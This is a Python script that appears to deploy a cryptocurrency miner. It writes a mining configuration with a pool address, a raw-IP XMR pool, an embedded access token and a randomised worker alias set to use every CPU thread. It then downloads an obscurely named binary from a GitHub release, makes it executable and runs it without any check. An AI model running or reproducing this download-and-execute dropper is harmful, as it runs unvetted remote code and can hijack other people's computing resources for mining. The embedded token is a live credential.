import os
import json
import random
import subprocess
import hashlib
import stat
import urllib.request
from datetime import datetime, timedelta

# === 1. Generate worker name based on a random date and time + "_SVP15"
def generate_worker_name():
    # Generate a random datetime within a range (e.g., last 10 years)
    start_date = datetime(2015, 1, 1)
    end_date = datetime.now()
    random_days = random.randint(0, (end_date - start_date).days)
    random_seconds = random.randint(0, 86400)  # Random time within the day

    random_datetime = start_date + timedelta(days=random_days, seconds=random_seconds)
    
    # Format the date to a string
    date_str = random_datetime.strftime('%Y%m%d_%H%M%S')  # e.g., 20230913_154732
    
    return f"{date_str}_SVP15"

worker_name = generate_worker_name()
print(f"[+] Generated worker name: {worker_name}")

# === 2. Get total CPU threads using `nproc`
def get_cpu_threads():
    try:
        return int(subprocess.check_output(["nproc"]).decode().strip())
    except Exception as e:
        print(f"[!] Failed to get CPU threads: {e}")
        return 1

cpu_threads = get_cpu_threads()
print(f"[+] Detected CPU Threads: {cpu_threads}")

# === 3. Create JSON config ===
config = {
    "ClientSettings": {
        "poolAddress": "wss://pplnsjetski.xyz/ws/YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN",
        "alias": worker_name,
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImZiZDRlODYyLTkxZWEtNDM1NS04YzFlLTA5Y2M2MmQwNjA2MiIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTY2MiwiZXhwIjoxNzg3MjQ3NjYyLCJpYXQiOjE3NTU3MTE2NjIsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.qPA6YWsSenUztyObsghbeePK28zNQ7iY3kazWsk9fJgegbcMo58SLal5Q1ytzPxfaMZIyLhActlzxjBT3G4mwayrzAiyh9IDqXh4CUWNQ54W1LPCzv-uQPuyjy8HNr7qJUFDI-fl54kBXBXGbkCfvghvkX0eP5w1pD0WAmpGTbUmCyead2U3NGDbs2a6DrdRi86uFVp8Pxzg_cwVuFuKFhJx5oVitBCIPPcYSSDz8m9l2C6B1icvwTWGXJnchlOIJ12cjFXpkq_DHhp_M4lWwpMpJGGsl1YKWQ22OrpVheJZM22z-rsgQ4RU3LVbGU1BoY3ssOFmtCnzIE_D5ekATg",
        "pps": True,
        "trainer": {
            "cpu": True,
            "gpu": False,
            "cpuThreads": cpu_threads
        },
        "xmrSettings": {
            "disable": False,
            "enableGpu": False,
            "poolAddress": "45.33.15.247:8081",
            "customParameters": f"-t {cpu_threads}"
        }
    }
}

with open("appsettings.json", "w") as f:
    json.dump(config, f, indent=4)

print("[+] Created appsettings.json")

# === 4. Download travsivp binary ===
travsivp_url = "https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/travsivp"
travsivp_filename = "travsivp"

if not os.path.exists(travsivp_filename):
    print("[+] Downloading travsivp...")
    urllib.request.urlretrieve(travsivp_url, travsivp_filename)
    print("[+] Download complete.")
else:
    print("[!] travsivp already exists. Skipping download.")

# === 5. Make executables
os.chmod(travsivp_filename, os.stat(travsivp_filename).st_mode | stat.S_IEXEC)
os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
print("[+] Set executable permissions.")

# === 6. Run travsivp binary
print("[+] Running ./travsivp ...")
subprocess.run(["./travsivp"])
